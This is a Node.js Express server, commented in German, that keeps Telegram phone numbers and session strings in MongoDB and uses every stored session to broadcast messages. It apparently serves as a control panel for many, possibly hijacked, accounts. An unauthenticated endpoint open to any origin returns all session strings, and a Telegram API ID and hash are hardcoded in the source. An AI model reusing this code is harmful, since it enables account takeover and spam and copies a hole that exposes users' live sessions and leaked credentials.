const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json());

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';
const MONGO_URI = process.env.MONGODB_URI || 'DEIN_MONGODB_CONNECTION_STRING';

mongoose.connect(MONGO_URI).then(() => console.log("DB Verbunden")).catch(err => console.log(err));

const SessionSchema = new mongoose.Schema({ phone: String, session: String, date: { type: Date, default: Date.now } });
const Session = mongoose.model('Session', SessionSchema);

// Alle Sessions laden
app.get('/get-sessions', async (req, res) => {
    const sessions = await Session.find({});
    res.json(sessions);
});

// Einzelne Session löschen
app.post('/delete-session', async (req, res) => {
    await Session.findByIdAndDelete(req.body.id);
    res.json({ success: true });
});

// Broadcast an alle (ACHTUNG: Telegram-Limits beachten!)
app.post('/broadcast', async (req, res) => {
    const { message } = req.body;
    const sessions = await Session.find({});
    
    for (let s of sessions) {
        try {
            const client = new TelegramClient(new StringSession(s.session), apiId, apiHash, { connectionRetries: 1 });
            await client.connect();
            // Sendet an 'me' (sich selbst) oder ändere es auf eine Gruppen-ID
            await client.sendMessage('me', { message: message });
            await client.disconnect();
        } catch (e) {
            console.error(`Fehler bei ${s.phone}: ${e.message}`);
        }
    }
    res.json({ success: true, count: sessions.length });
});

app.listen(process.env.PORT || 3000, () => console.log("Server aktiv."));
